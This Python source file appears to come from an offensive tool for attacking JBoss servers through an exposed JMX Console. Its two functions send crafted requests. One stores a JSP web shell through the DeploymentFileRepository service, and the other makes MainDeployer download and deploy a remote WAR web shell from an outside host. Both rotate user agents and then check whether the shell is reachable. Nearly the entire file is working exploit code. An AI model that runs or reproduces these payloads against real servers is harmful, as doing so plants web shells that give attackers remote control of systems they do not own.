from src.exploits.ex1 import get_successfully
from src.payloads.exploit_jmx_console_file_repository import jsp__exploit_jmx_console_file_repository
from src.utils.colors import Colors
from src.utils.misc import get_random_user_agent, print_and_flush


def exploit_jmx_console_file_repository(url: str) -> int:
    """
    Uses JMX Console FileRepository to store and deploy a WAR, returns the deployment status.
    """
    jsp = jsp__exploit_jmx_console_file_repository
    payload = (
        "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
        f"DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=jexws4.war"
        "&argType=java.lang.String&arg1=jexws4&argType=java.lang.String&arg2=.jsp"
        f"&argType=java.lang.String&arg3={jsp}&argType=boolean&arg4=True"
    )
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    gl_http_pool.request("HEAD", url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/jexws4/jexws4.jsp")


def exploit_jmx_console_main_deploy(url: str) -> int:
    """
    Форсирует деплой WAR-файла через JMX Console MainDeployer, возвращает HTTP-статус развёртывания.
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    jsp_url = "http://www.joaomatosf.com/rnp/jexws4.war"
    endpoint = (
            "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
            "MainDeployer&methodIndex=19&arg0=" + jsp_url
    )
    print_and_flush(
        f"{Colors.GREEN}\n * Info: This exploit will force the server to deploy the webshell \n"
        f"   available at: {jsp_url}{Colors.ENDC}"
    )

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent()
    }
    gl_http_pool.request("HEAD", url + endpoint, redirect=False, headers=headers)
    return get_successfully(url, "/jexws4/jexws4.jsp")
